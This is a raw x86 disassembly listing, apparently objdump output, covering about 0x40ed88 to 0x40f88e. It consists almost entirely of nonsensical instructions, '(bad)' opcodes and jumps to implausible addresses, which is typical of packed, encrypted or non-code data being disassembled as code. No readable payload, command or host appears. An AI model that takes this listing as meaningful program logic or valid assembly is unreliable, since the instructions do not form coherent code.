  40ed88:	les    eax,FWORD PTR [edi]
  40ed8a:	xor    bh,BYTE PTR ds:[ebx]
  40ed8d:	jle    0x40ed79
  40ed8f:	mov    eax,ds:0x129e3c83
  40ed94:	inc    ebx
  40ed95:	add    BYTE PTR [esi],bh
  40ed97:	pop    edi
  40ed98:	add    DWORD PTR [ebx],ebp
  40ed9a:	jle    0x40ee15
  40ed9c:	retf   
  40ed9d:	rol    DWORD PTR [esi-0x4e],0x82
  40eda1:	aaa    
  40eda2:	enter  0x3a66,0x8b
  40eda6:	jmp    0x40ed4d
  40eda8:	dec    esp
  40eda9:	sbb    DWORD PTR [ecx+esi*4],0xb
  40edad:	shr    BYTE PTR [ebx+0x3a7c83ac],cl
  40edb3:	mov    bl,0x6d
  40edb5:	add    al,0x55
  40edb7:	bnd jmp 0x40eddd
  40edba:	sbb    DWORD PTR [edi+0x8],ebp
  40edbd:	mov    edi,DWORD PTR [ebx-0x4a]
  40edc0:	std    
  40edc1:	(bad)  
  40edc2:	cmp    eax,0x1ec102b2
  40edc7:	pop    ebx
  40edc8:	jmp    0x40ee1d
  40edca:	out    0x82,al
  40edcc:	jo     0x40edc6
  40edce:	lock or ah,BYTE PTR [edx+0x4e]
	...
  40edfa:	add    BYTE PTR [eax],al
  40edfc:	sbb    DWORD PTR ss:[ecx-0x64b09508],edi
  40ee03:	jmp    0x40edd4
  40ee05:	(bad)  
  40ee06:	cmp    eax,0x200069f8
  40ee0b:	lds    eax,FWORD PTR [ecx+0x5b]
  40ee0e:	add    bl,ch
  40ee10:	shl    BYTE PTR ds:0x5332f8f5,0x93
  40ee17:	add    esp,DWORD PTR [ebx+ebx*2]
  40ee1a:	push   ss
  40ee1b:	push   cs
  40ee1c:	mov    ebx,0xbd03a7fb
  40ee21:	xchg   esi,eax
  40ee22:	fmul   DWORD PTR [esi+edi*2]
  40ee25:	test   BYTE PTR es:[edx+0x7829efa],cl
  40ee2c:	mov    ebx,0x9652f915
  40ee31:	out    0x70,eax
  40ee33:	idiv   DWORD PTR [eax+0x30]
  40ee36:	jmp    0x38ebe8c3
  40ee3b:	div    edx
  40ee3d:	sahf   
  40ee3e:	int    0x11
  40ee40:	ret    
  40ee41:	sti    
  40ee42:	daa    
  40ee43:	add    al,0xbd
  40ee45:	xchg   esi,eax
  40ee46:	in     al,dx
  40ee47:	or     bh,BYTE PTR [esi+0x25]
  40ee4a:	cli    
  40ee4b:	mov    BYTE PTR [edx],al
  40ee4d:	stos   DWORD PTR es:[edi],eax
  40ee4e:	imul   edi,DWORD PTR [edx+edi*1+0x5b],0x1bc51b1d
  40ee56:	icebp  
  40ee57:	inc    ebx
  40ee58:	mov    es,WORD PTR [ebx-0x64d773e7]
  40ee5e:	popa   
  40ee5f:	fadd   QWORD PTR [eax]
	...
  40ee89:	add    BYTE PTR [edx-0x560886e0],dh
  40ee8f:	arpl   WORD PTR [edx],bx
  40ee91:	mul    DWORD PTR [ecx-0x547effa1]
  40ee97:	loop   0x40ee97
  40ee99:	outs   dx,BYTE PTR ds:[esi]
  40ee9a:	xchg   esp,eax
  40ee9b:	pop    ebx
  40ee9c:	lea    ebp,[ebp+ebp*8-0x350b00d6]
  40eea3:	cmp    DWORD PTR [ecx-0x17],eax
  40eea6:	mov    esp,0x3ac3079e
  40eeab:	call   0x9e91:0x6fd14574
  40eeb2:	jp     0x40ef0f
  40eeb4:	sub    DWORD PTR ds:0x92c2e63a,0xfffffff2
  40eebb:	pushf  
  40eebc:	pop    es
  40eebd:	jmp    0x1f2cd4d0
  40eec2:	das    
  40eec3:	call   FWORD PTR [si-0x65cb]
  40eec8:	adc    al,0x71
  40eeca:	sbb    bl,BYTE PTR [eax+eax*1]
  40eecd:	push   0x7e
  40eecf:	bound  edx,QWORD PTR [eax-0x2]
  40eed2:	push   cs
  40eed3:	addr16 (bad) 
  40eed5:	jl     0x40ef0c
  40eed7:	call   0x6a00:0x1c1a5514
  40eede:	mov    ecx,0x4a348b62
  40eee3:	in     al,0x1
  40eee5:	xor    DWORD PTR [ebx-0x64],edi
  40eee8:	or     ebp,ecx
  40eeea:	push   cs
  40eeeb:	out    0xeb,al
  40eeed:	push   0x0
	...
  40ef17:	add    BYTE PTR [ecx+0x4634fe82],bl
  40ef1d:	or     ecx,0x65
  40ef20:	push   eax
  40ef21:	cdq    
  40ef22:	or     ch,BYTE PTR [ecx-0x5436a132]
  40ef28:	dec    ebp
  40ef29:	pop    ebx
  40ef2a:	call   DWORD PTR [esi+eax*2]
  40ef2d:	cmp    DWORD PTR [edi+eax*2-0x56f566d0],0xffffff91
  40ef35:	pop    edi
  40ef36:	leave  
  40ef37:	add    ch,ah
  40ef39:	ins    DWORD PTR es:[edi],dx
  40ef3a:	add    bh,bh
  40ef3c:	or     ch,BYTE PTR [edx-0x1]
  40ef3f:	jne    0x40ef28
  40ef41:	test   ebx,eax
  40ef43:	std    
  40ef44:	nop
  40ef45:	xchg   ecx,eax
  40ef46:	or     eax,eax
  40ef48:	sbb    bl,BYTE PTR [edx+0x5df7c2c7]
  40ef4e:	push   0x1ef784
  40ef53:	push   0x40fde4
  40ef58:	outs   dx,DWORD PTR ds:[esi]
  40ef59:	dec    esi
  40ef5a:	xchg   edx,eax
  40ef5b:	call   DWORD PTR [eax]
  40ef5d:	shl    BYTE PTR gs:[ebp-0x20],0x5
  40ef62:	test   BYTE PTR [eax-0x6a],ah
  40ef65:	pop    ebp
  40ef66:	push   0x1e80a5
  40ef6b:	call   0x3edb22
  40ef70:	pushf  
  40ef71:	popf   
  40ef72:	or     eax,0x5f5a84
  40ef77:	add    BYTE PTR [edx],dl
  40ef79:	sbb    edi,esp
  40ef7b:	push   eax
	...
  40efa4:	add    BYTE PTR [eax],al
  40efa6:	nop
  40efa7:	or     DWORD PTR [edi+edi*8],ecx
  40efaa:	push   0x19
  40efac:	pop    edi
  40efad:	inc    ecx
  40efae:	xchg   edi,eax
  40efaf:	fadd   st(2),st
  40efb1:	or     BYTE PTR [ebp+ebx*4+0xd],ch
  40efb5:	test   edx,eax
  40efb7:	pop    ebp
  40efb8:	add    BYTE PTR [eax],al
  40efba:	std    
  40efbb:	pop    esi
  40efbc:	lea    eax,[ebp-0x71]
  40efbf:	cs push 0xffffffff
  40efc2:	out    dx,eax
  40efc3:	jno    0x40f026
  40efc5:	inc    ecx
  40efc6:	mov    ?,WORD PTR [bp+di-0x4]
  40efca:	nop
  40efcb:	imul   ecx,DWORD PTR [eax+eiz*2-0x3b7ca0ea],0xfc0643b
  40efd6:	call   0xf382:0x3effffdf
  40efdd:	je     0x40f005
  40efdf:	jmp    0x8304:0x439e900e
  40efe6:	cli    
  40efe7:	jle    0x40f068
  40efe9:	mul    DWORD PTR [edx-0x6b17026a]
  40efef:	add    DWORD PTR [edx],0x0
  40eff2:	retf   
  40eff3:	(bad)  
  40eff4:	out    dx,al
  40eff5:	dec    edi
  40eff6:	fs xor bl,0x74
  40effa:	out    0x1a,al
  40effc:	adc    bh,bh
  40effe:	loope  0x40f029
  40f000:	or     eax,eax
  40f002:	dec    ecx
  40f003:	push   es
  40f004:	inc    ebp
  40f005:	add    DWORD PTR [esi],edi
  40f007:	cmp    BYTE PTR [edi+0x7c],0x0
	...
  40f033:	add    dl,dl
  40f035:	add    BYTE PTR [ebx],0x84
  40f038:	jnp    0x40efbd
  40f03a:	add    al,BYTE PTR [eax]
  40f03c:	mov    esi,0xba0f027a
  40f041:	mov    dh,0x1
  40f043:	add    BYTE PTR [esi],bh
  40f045:	rol    BYTE PTR [edi+0x50c4aa54],cl
  40f04b:	call   0xff35f9ba
  40f050:	hlt    
  40f051:	or     bh,BYTE PTR [edi]
  40f053:	call   0xff3007e1
  40f058:	or     ebx,DWORD PTR [edx+0x52]
  40f05b:	call   0xff34f96d
  40f060:	jns    0x40f0a1
  40f062:	hlt    
  40f063:	jmp    FWORD PTR [ecx-0x7e]
  40f066:	add    al,bh
  40f068:	sti    
  40f069:	aad    0x2
  40f06b:	add    BYTE PTR [esi],bh
  40f06d:	cmp    BYTE PTR [edi+0x3c],0xb2
  40f071:	and    al,BYTE PTR [ebx+0x0]
  40f074:	ds push edi
  40f076:	push   edx
  40f077:	push   0x4323ac
  40f07c:	es pop ebx
  40f07e:	arpl   WORD PTR [edx+0x3e],si
  40f081:	pop    ebx
  40f082:	cmp    DWORD PTR [esp+ecx*8-0x7],ebp
  40f086:	daa    
  40f087:	add    al,0x21
  40f089:	push   cs
  40f08a:	sub    ebx,0x3e90c9f
  40f090:	inc    ebp
  40f091:	fwait
  40f092:	hlt    
  40f093:	sbb    edx,DWORD PTR [esi+0x4307f2]
	...
  40f0c1:	add    BYTE PTR [esi],bh
  40f0c3:	or     DWORD PTR [esi+0x72],0x3e
  40f0c7:	pop    ebx
  40f0c8:	mov    ecx,0xa7f9d76b
  40f0cd:	add    ebp,ecx
  40f0cf:	or     eax,0xc7beb41
  40f0d4:	jmp    0xbcdc35dc
  40f0d9:	dec    ebx
  40f0da:	mov    dx,0x42c7
  40f0de:	sub    DWORD PTR ds:[edx+0x72],0x3e
  40f0e3:	pop    ebx
  40f0e4:	cdq    
  40f0e5:	imul   ebx,edi,0xfffffff9
  40f0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0e9:	add    esi,DWORD PTR [ecx+0x57eb110d]
  40f0ef:	or     al,0xe9
  40f0f1:	add    edx,DWORD PTR [ebp-0x45c995b8]
  40f0f7:	cli    
  40f0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0f9:	add    edi,DWORD PTR [edi]
  40f0fb:	push   cs
  40f0fc:	jecxz  0x40f169
  40f0fe:	aam    0xf9
  40f100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f101:	add    edx,DWORD PTR [esi+0x3e037837]
  40f107:	sub    edx,DWORD PTR [ecx-0x62]
  40f10a:	ficomp WORD PTR [ecx]
  40f10c:	jmp    0xc0c3e403
  40f111:	or     ebp,ebp
  40f113:	pop    edx
  40f114:	jmp    0x41d35f7
  40f119:	nop
  40f11a:	icebp  
  40f11b:	sbb    ecx,ebp
  40f11d:	add    eax,0x2005cd3
  40f122:	jp     0x40f188
  40f124:	shl    BYTE PTR [eax+eax*1],0x0
	...
  40f150:	pushf  
  40f151:	call   0x1cb8e9a
  40f156:	add    DWORD PTR [esi-0x23186c59],ebx
  40f15c:	das    
  40f15d:	xchg   esi,eax
  40f15e:	dec    BYTE PTR [esi-0x6eb07069]
  40f164:	pop    ebp
  40f165:	cwde   
  40f166:	(bad)  
  40f167:	jle    0x40f0f4
  40f169:	pop    ds
  40f16a:	lock fs ja 0x40f0fd
  40f16e:	dec    edi
  40f16f:	add    eax,DWORD PTR [eax-0x6a]
  40f172:	je     0x40f1d5
  40f174:	adc    dh,BYTE PTR [edx-0x2]
  40f177:	pop    esi
  40f178:	in     eax,dx
  40f179:	xchg   ebp,eax
  40f17a:	je     0x40f1d9
  40f17c:	mov    al,BYTE PTR [ebx-0x6a32b3ec]
  40f182:	mov    BYTE PTR [ecx+esi*8+0x42517cd9],ch
  40f189:	sysenter 
  40f18b:	push   0x4f
  40f18d:	xchg   edi,edi
  40f18f:	mov    ah,0x5f
  40f191:	add    eax,DWORD PTR [eax]
  40f193:	jmp    0x953fca34
  40f198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f199:	jle    0x40f168
  40f19b:	imul   ebp,DWORD PTR [ebp+0x7594fe95],0xffffff95
  40f1a2:	je     0x40f195
  40f1a4:	jne    0x40f1e5
  40f1a6:	cmp    esi,0xffffff8c
  40f1a9:	xchg   ebp,eax
  40f1aa:	je     0x40f1a5
  40f1ac:	mov    WORD PTR [edi],cs
  40f1ae:	or     BYTE PTR [ecx],al
  40f1b0:	dec    eax
  40f1b1:	(bad)  
  40f1b3:	out    0x0,al
	...
  40f1dd:	add    BYTE PTR [edi+ecx*1-0x14],ch
  40f1e1:	fsubrp st(6),st
  40f1e3:	(bad)  
  40f1e4:	call   0xfed6aacf
  40f1e9:	into   
  40f1ea:	(bad)  
  40f1eb:	mov    ah,bh
  40f1ed:	add    BYTE PTR [ebx-0x7700021d],dl
  40f1f3:	adc    ebp,esp
  40f1f5:	call   0x3ed575
  40f1fa:	call   0xc429da11
  40f1ff:	loop   0x40f1fe
  40f201:	dec    esi
  40f203:	frndint 
  40f205:	dec    eax
  40f207:	mov    BYTE PTR [ebx-0x4],dh
  40f20a:	enter  0x8872,0x60
  40f20e:	pop    di
  40f210:	add    esp,0x23
  40f213:	mov    dl,0x7f
  40f215:	cld    
  40f216:	mov    BYTE PTR [ecx+0x5a17c2c7],cl
  40f21c:	push   ebp
  40f21d:	mov    ecx,DWORD PTR [ebx-0x77ff95d3]
  40f223:	adc    ecx,DWORD PTR [eax]
  40f225:	call   0x3f08d6
  40f22a:	pop    esp
  40f22b:	mov    ds:0xa4de851,al
  40f230:	add    BYTE PTR [eax],al
  40f232:	int3   
  40f233:	cdq    
  40f234:	jb     0x40f251
  40f236:	aam    0x9c
  40f238:	inc    esi
  40f239:	jmp    0x40f1d0
  40f23b:	fnstenv [esi]
  40f23d:	or     eax,0x388062d3
	...
  40f26a:	add    BYTE PTR [eax],al
  40f26c:	lods   eax,DWORD PTR ds:[esi]
  40f26d:	adc    al,BYTE PTR ds:0xeb5997c6
  40f273:	add    bh,BYTE PTR [ebx+eiz*2]
  40f276:	dec    eax
  40f277:	cmp    esp,DWORD PTR [ebp+ecx*1-0x16]
  40f27b:	mov    edx,DWORD PTR [ebp+eiz*1-0x37]
  40f27f:	ret    0x5993
  40f282:	push   ebp
  40f283:	mov    edi,DWORD PTR [ebx-0x21]
  40f286:	ret    0x30b4
  40f289:	mov    WORD PTR [ebx+0xc],?
  40f28c:	(bad)
  40f290:	lods   eax,DWORD PTR ds:[esi]
  40f292:	cld    
  40f293:	mov    edi,0xc94f7ed3
  40f298:	jl     0x40f24d
  40f29a:	add    bh,bh
  40f29c:	rol    DWORD PTR [edi-0x336db226],cl
  40f2a2:	lock or bh,dh
  40f2a5:	dec    esi
  40f2a6:	pop    es
  40f2a7:	pop    edi
  40f2a8:	pop    es
  40f2a9:	rcl    DWORD PTR [ebx],0x0
  40f2ac:	sub    DWORD PTR [eax+0x18],esi
  40f2af:	jmp    FWORD PTR [ebx+0x1554da92]
  40f2b5:	out    0xf0,al
  40f2b7:	mov    WORD PTR [ebx+0x12],?
  40f2ba:	push   esp
  40f2bb:	call   DWORD PTR [ebx-0x4b0e257a]
  40f2c1:	or     eax,0xb5fe0af1
  40f2c6:	xchg   BYTE PTR [edi],al
  40f2c8:	cmp    eax,0x73ff0282
  40f2cd:	ss icebp 
  40f2cf:	je     0x40f2d1
	...
  40f2f9:	add    dh,ah
  40f2fb:	sbb    bh,BYTE PTR [ebx-0x2da2671]
  40f301:	mov    edi,0x1e00641
  40f306:	cmp    BYTE PTR ds:[ecx+0x44],0xd2
  40f30b:	stc    
  40f30c:	jmp    0x40f38d
  40f30e:	jns    0x40f292
  40f310:	inc    DWORD PTR [ebx+0x28088]
  40f316:	adc    DWORD PTR [edx+0x57],ebp
  40f319:	jmp    DWORD PTR [ecx+0x6e447b6d]
  40f31f:	gs ja  0x40f2f2
  40f322:	es mov bl,0x61
  40f325:	inc    ecx
  40f326:	ds push 0x65
  40f329:	jo     0x40f369
  40f32b:	adc    BYTE PTR [edx-0x1],0xf3
  40f32f:	jno    0x40f38d
  40f331:	adc    eax,0x4285adf
  40f336:	push   esi
  40f337:	cs pop ecx
  40f339:	add    al,0x3e
  40f33b:	sub    edx,esi
  40f33d:	jbe    0x40f3ad
  40f33f:	add    esi,eax
  40f341:	(bad)  
  40f342:	call   FWORD PTR [edx-0x2f]
  40f345:	dec    eax
  40f346:	into   
  40f347:	pop    edx
  40f348:	jmp    0xa9a0da9a
  40f34d:	ja     0x40f399
  40f34f:	pusha  
  40f350:	fwait
  40f351:	ja     0x40f399
  40f353:	pusha  
  40f354:	mov    al,0x0
  40f356:	ret    
  40f357:	loopne 0x40f343
  40f359:	add    edi,DWORD PTR [esi]
  40f35b:	pusha  
  40f35c:	mov    al,ds:0x76
	...
  40f385:	add    BYTE PTR [eax],al
  40f387:	add    BYTE PTR [edi-0x64],al
  40f38a:	and    edi,DWORD PTR [eax+0x3e95b3e]
  40f390:	adc    eax,0xca46a65c
  40f395:	pop    edx
  40f396:	jmp    0xb9d8319e
  40f39b:	ret    
  40f39c:	mov    dh,0x93
  40f39e:	gs lock call 0x396c822d
  40f3a5:	push   cs
  40f3a6:	jmp    0xe8c47673
  40f3ab:	add    edi,DWORD PTR [esi]
  40f3ad:	pop    ebx
  40f3ae:	imul   esi,DWORD PTR [eax],0x4b65643e
  40f3b4:	cmp    al,0x5b
  40f3b6:	jmp    0x2ef49a13
  40f3bb:	lock mov al,0xe1
  40f3be:	stos   DWORD PTR es:[edi],eax
  40f3bf:	mov    edi,0x31115bc
  40f3c4:	sub    edi,DWORD PTR [edx]
  40f3c6:	xor    ebx,0xf0e91a08
  40f3cc:	or     ah,BYTE PTR [edi+0x5b18e810]
  40f3d2:	jmp    0xa4b5d3
  40f3d7:	ins    BYTE PTR es:[edi],dx
  40f3d8:	dec    ebx
  40f3d9:	pop    ecx
  40f3da:	add    cl,ch
  40f3dc:	xchg   BYTE PTR [esi],bl
  40f3de:	call   0x9c31cb
  40f3e3:	shl    BYTE PTR [eax+0x59],1
  40f3e6:	add    cl,ch
  40f3e8:	mov    esp,0xe8e816
	...
  40f415:	add    dh,dl
  40f417:	arpl   WORD PTR [ecx+0x449c5644],cx
  40f41d:	sar    DWORD PTR [ebx+ebx*2],1
  40f420:	add    cl,ch
  40f422:	sbb    bl,BYTE PTR [esi-0x21c21700]
  40f428:	jl     0x40f3bb
  40f42a:	cmp    al,0x8
  40f42c:	pshufw mm5,QWORD PTR [edi-0x5d33985],0x5d
  40f434:	add    cl,ch
  40f436:	cmp    eax,0x3de8ad84
  40f43b:	pop    ebx
  40f43c:	cmp    esp,0xffffffe5
  40f43f:	pop    ebp
  40f440:	jne    0x40f428
  40f442:	jp     0x40f453
  40f444:	fsub   QWORD PTR [esi-0x16fc7c79]
  40f44a:	cmp    eax,0x3b80e95b
  40f44f:	pop    ebx
  40f450:	add    BYTE PTR [edx+0x4f],ch
  40f453:	add    DWORD PTR [ebx],0xffffffd4
  40f456:	shl    bl,1
  40f458:	jl     0x40f47b
  40f45a:	add    DWORD PTR [eax],ebx
  40f45c:	call   0x9c3245
  40f461:	inc    eax
  40f462:	(bad)  
  40f463:	pop    ebx
  40f464:	add    cl,ch
  40f466:	mov    esp,0xa8ece80f
  40f46b:	xlat   BYTE PTR ds:[ebx]
  40f46c:	ins    BYTE PTR es:[edi],dx
  40f46d:	call   0x94ca4faf
  40f472:	jno    0x40f451
  40f474:	jl     0x40f4cb
  40f476:	cmp    al,BYTE PTR [edi]
  40f478:	or     DWORD PTR [eax],eax
	...
  40f4a2:	add    BYTE PTR [eax],al
  40f4a4:	pop    eax
  40f4a5:	and    al,0xe8
  40f4a7:	add    dl,BYTE PTR [edi+0x68eb005e]
  40f4ad:	cdq    
  40f4ae:	inc    ebx
  40f4af:	call   0x41530d
  40f4b4:	cwde   
  40f4b5:	and    eax,eax
  40f4b7:	add    BYTE PTR [edi+0x5e],dl
  40f4ba:	add    bh,al
  40f4bc:	sub    cl,bh
  40f4be:	(bad)  
  40f4bf:	jmp    DWORD PTR [edi+0x5e]
  40f4c2:	mov    DWORD PTR [ebp-0x65],0x5700005e
  40f4c9:	cdq    
  40f4ca:	inc    ebx
  40f4cb:	mov    esp,0x5e27
  40f4d0:	fsub   DWORD PTR [edx]
  40f4d2:	mov    eax,0x5e1700
  40f4d7:	dec    DWORD PTR [edx-0x7d]
  40f4da:	out    0x13,al
  40f4dc:	mov    cl,0x80
  40f4de:	std    
  40f4df:	mov    DWORD PTR [edx-0x69],ebx
  40f4e2:	std    
  40f4e3:	jne    0x40f4c8
  40f4e5:	mov    ch,0x6
  40f4e7:	inc    BYTE PTR [eax-0x60ba787f]
  40f4ed:	xor    BYTE PTR [ebx-0x2c],0xbf
  40f4f1:	mov    bh,bl
  40f4f3:	jmp    DWORD PTR [eax+0xf]
  40f4f6:	inc    esp
  40f4f7:	les    edx,FWORD PTR [ebx+ecx*2-0x64]
  40f4fb:	pusha  
  40f4fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4fd:	pop    ebp
  40f4fe:	add    BYTE PTR [ebp-0x6b],dh
  40f501:	xor    eax,0x5d966192
  40f506:	call   0x40f592
	...
  40f52f:	add    BYTE PTR [eax],al
  40f531:	add    cl,dh
  40f533:	pop    ebp
  40f534:	add    BYTE PTR [eax+0x7f],dl
  40f537:	jmp    0x40f598
  40f539:	inc    ecx
  40f53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f53b:	xor    BYTE PTR [ebx-0x40],0x4f
  40f53f:	jno    0x40f5b1
  40f541:	add    BYTE PTR [edi+0x3e74be94],dl
  40f547:	mov    WORD PTR [edx-0x67],ds
  40f54a:	pop    ds
  40f54b:	ret    
  40f54c:	add    ch,al
  40f54e:	adc    eax,0xee0002ea
  40f553:	jmp    0x40f4e0
  40f555:	pusha  
  40f556:	inc    DWORD PTR [ebx+0x5b7e74ed]
  40f55c:	adc    dh,BYTE PTR [eax+0x3e]
  40f55f:	test   bh,dh
  40f561:	mov    edi,0xa15c70ea
  40f566:	fild   WORD PTR [edx+0x4]
  40f569:	call   0x45476f
  40f56e:	out    dx,al
  40f56f:	sub    esp,DWORD PTR [ebx-0x147c00a0]
  40f575:	je     0x40f575
  40f577:	call   0x24d7:0x823e6ef4
  40f57e:	mov    ebp,0x7f5f8e77
  40f583:	add    BYTE PTR [ecx],0x75
  40f586:	xor    al,0x5a
  40f588:	call   0x982b:0xda827f60
  40f58f:	add    BYTE PTR [edx],0x50
  40f592:	xchg   esi,eax
  40f593:	sub    al,0x63
  40f595:	inc    ecx
	...
  40f5be:	add    BYTE PTR [eax],al
  40f5c0:	or     DWORD PTR ds:[edi-0x40],esi
  40f5c4:	out    0xe6,al
  40f5c6:	pop    esp
  40f5c7:	add    BYTE PTR [esi],bh
  40f5c9:	sub    eax,0x8dfe2b02
  40f5ce:	ret    0x5c74
  40f5d1:	sub    DWORD PTR [edi-0x38],esi
  40f5d4:	out    0xb0,al
  40f5d6:	pop    esp
  40f5d7:	add    BYTE PTR [esi],bh
  40f5d9:	bnd jmp 0x40f650
  40f5dc:	imul   BYTE PTR [edx]
  40f5de:	stc    
  40f5df:	stc    
  40f5e0:	mov    ecx,0xf2447b49
  40f5e5:	inc    ecx
  40f5e6:	ja     0x40f5ac
  40f5e8:	xchg   esi,eax
  40f5e9:	pop    ebx
  40f5ea:	and    ebx,DWORD PTR [edi+0x3e]
  40f5ed:	pop    ebx
  40f5ee:	mov    ecx,0x9712ec
  40f5f3:	cmc    
  40f5f4:	xchg   esi,eax
  40f5f5:	nop
  40f5f6:	or     eax,0x69d3027b
  40f5fb:	outs   dx,DWORD PTR ds:[esi]
  40f5fc:	jle    0x40f659
  40f5fe:	jne    0x40f637
  40f600:	mov    ebp,0xea04310e
  40f605:	inc    eax
  40f606:	add    DWORD PTR [ebx],0xeca6803e
  40f60c:	jmp    0xd58f:0xd8b3d162
  40f613:	in     al,dx
  40f614:	retf   0xcd9a
  40f617:	jbe    0x40f64f
  40f619:	sub    ebp,0xffffff83
  40f61c:	inc    eax
  40f61d:	nop
  40f61e:	mov    ebp,0x3b8ffa76
  40f623:	cld    
	...
  40f64c:	add    BYTE PTR [eax],al
  40f64e:	sbb    DWORD PTR [edi-0x6fd712d3],ecx
  40f654:	sbb    ebp,DWORD PTR [eax+eiz*1+0xedbf106]
  40f65b:	adc    BYTE PTR [esi-0x56f9ef14],dl
  40f661:	fcomi  st,st(3)
  40f663:	fadd   QWORD PTR [ebp-0x4ef9ff14]
  40f669:	fisttp DWORD PTR [ebx]
  40f66b:	fnsave [ebp-0x14]
  40f66e:	lock add eax,0xdd03dba5
  40f674:	gs in  al,dx
  40f676:	loopne 0x40f67d
  40f678:	popf   
  40f679:	fistp  DWORD PTR [ebx-0x2f13aa24]
  40f67f:	add    eax,0xdc93db91
  40f684:	inc    ebp
  40f685:	in     al,dx
  40f686:	aam    0x5d
  40f688:	push   0x6e
  40f68a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f68b:	pop    eax
  40f68c:	add    BYTE PTR [edx+edi*1+0x3f414498],bh
  40f693:	pop    ebx
  40f694:	add    cl,ch
  40f696:	mov    esi,0x11e9e80e
  40f69b:	dec    ebx
  40f69c:	push   0x1a5219
  40f6a1:	push   cs
  40f6a2:	adc    BYTE PTR [edi+0x5ae011e7],bl
  40f6a8:	add    dl,dh
  40f6aa:	jge    0x40f6b2
  40f6ac:	pop    es
  40f6ad:	cs clc 
  40f6af:	add    BYTE PTR [eax],0xe9
	...
  40f6da:	add    BYTE PTR [eax],al
  40f6dc:	cmp    eax,0xdb77685b
  40f6e1:	sbb    DWORD PTR [eax],eax
  40f6e3:	fmulp  st(7),st
  40f6e5:	sahf   
  40f6e6:	out    0xb9,eax
  40f6e8:	neg    DWORD PTR [edx+0x0]
  40f6eb:	loop   0x40f76a
  40f6ed:	push   es
  40f6ee:	pop    es
  40f6ef:	scas   al,BYTE PTR es:[edi]
  40f6f0:	inc    DWORD PTR [edx+0x5b3de901]
  40f6f6:	(bad)  
  40f6f7:	cmp    al,0xf6
  40f6f9:	jbe    0x40f763
  40f6fb:	imul   edx,DWORD PTR ds:0xfddafb8e,0xffffffd3
  40f702:	(bad)  
  40f703:	sahf   
  40f704:	and    eax,0x6247f18e
  40f709:	push   esi
  40f70a:	pcmpgtb mm6,QWORD PTR [ebp+0x1586fe8f]
  40f711:	or     al,dl
  40f713:	xchg   ecx,eax
  40f714:	xor    eax,0xe576fed9
  40f719:	pop    es
  40f71a:	in     al,dx
  40f71b:	cmp    DWORD PTR [ebp-0x27],0x176766fe
  40f722:	lock mov ecx,0x568808f5
  40f728:	in     eax,0x76
  40f72a:	jmp    0x40f77d
  40f72c:	aad    0x8d
  40f72e:	pop    esi
  40f72f:	add    BYTE PTR [esi],cl
  40f731:	xchg   ebp,eax
  40f732:	push   cs
  40f733:	add    dl,dl
  40f735:	or     eax,0xcb6381eb
  40f73a:	cld    
  40f73b:	call   FWORD PTR [eax-0x66]
  40f73e:	cmp    DWORD PTR [eax+0x0],0x0
	...
  40f769:	add    BYTE PTR [ecx-0x7e],bl
  40f76c:	std    
  40f76d:	add    BYTE PTR [edi-0x1d74ffa6],ah
  40f773:	pop    esi
  40f774:	or     eax,eax
  40f776:	mov    bl,0x5b
  40f778:	cmp    BYTE PTR [eax],0x97
  40f77b:	or     eax,DWORD PTR ds:0x58a3e9
  40f781:	add    BYTE PTR [eax+0xb],ch
  40f784:	adc    al,0xe8
  40f786:	iret   
  40f787:	adc    edi,esi
  40f789:	jmp    FWORD PTR [edx+ebx*4+0x73]
  40f78d:	pxor   mm1,QWORD PTR [ebx-0x7e98beb3]
  40f794:	jae    0x40f7aa
  40f796:	jg     0x40f784
  40f798:	cmp    edi,0x78
  40f79b:	lods   eax,DWORD PTR ds:[esi]
  40f79c:	or     ebp,DWORD PTR [eax-0x3]
  40f79f:	push   eax
  40f7a0:	inc    ecx
  40f7a1:	add    al,ch
  40f7a3:	or     dl,BYTE PTR [eax+ebp*8]
  40f7a6:	mov    al,ds:0xaefffddb
  40f7ab:	(bad)  [esi+0x6680b8fe]
  40f7b1:	ds es pop edx
  40f7b4:	add    BYTE PTR [ebp-0x3675e],cl
  40f7ba:	mov    eax,0x66ffe829
  40f7bf:	cmp    ebp,0xfc98628d
  40f7c5:	call   FWORD PTR [eax+0x2a]
  40f7c8:	push   DWORD PTR [ebp-0x27c61]
	...
  40f7f6:	add    BYTE PTR [eax],al
  40f7f8:	outs   dx,DWORD PTR ds:[esi]
  40f7f9:	inc    edi
  40f7fa:	ins    DWORD PTR es:[edi],dx
  40f7fb:	add    BYTE PTR [esi],bh
  40f7fd:	test   BYTE PTR [ebx-0x7c],bh
  40f800:	mov    bl,BYTE PTR ds:0x857efeea
  40f806:	jle    0x40f7ed
  40f808:	aas    
  40f809:	test   BYTE PTR [edx],al
  40f80b:	(bad)  
  40f80c:	retf   
  40f80d:	inc    ecx
  40f80e:	jmp    0x585a211
  40f813:	adc    BYTE PTR [esi],bh
  40f815:	test   BYTE PTR [edx],al
  40f817:	cmpunordps xmm0,XMMWORD PTR [eax]
  40f81b:	add    BYTE PTR [esi],bh
  40f81d:	test   DWORD PTR [esp+ebp*1-0x12],0xff4ef2db
  40f825:	sbb    edx,0x9
  40f828:	jmp    0x40f7ad
  40f82a:	add    cl,BYTE PTR [ebx]
  40f82c:	jle    0x40f83c
  40f82e:	add    cl,ch
  40f830:	mov    BYTE PTR [edx+0xeb30002],0xc6
  40f837:	std    
  40f838:	pop    ecx
  40f839:	lods   al,BYTE PTR ds:[esi]
  40f83a:	jbe    0x40f87d
  40f83c:	and    dl,BYTE PTR [esp+ebx*2-0xe]
  40f840:	stc    
  40f841:	inc    edx
  40f842:	add    al,0xe8
  40f844:	push   ebx
  40f845:	daa    
  40f846:	add    al,0x0
  40f848:	inc    ebp
  40f849:	ret    0x56e
  40f84c:	daa    
  40f84d:	dec    edx
  40f84e:	add    eax,DWORD PTR [eax]
  40f850:	ds mov ebp,0x2f16146e
  40f856:	js     0x40f856
  40f858:	sbb    DWORD PTR [edx+0x74c2],ecx
	...
  40f886:	inc    ecx
  40f887:	pop    edx
  40f888:	mov    bl,0x47
  40f88a:	jg     0x40f80e
  40f88c:	out    0x74,eax
  40f88e:	sub    ch,dl
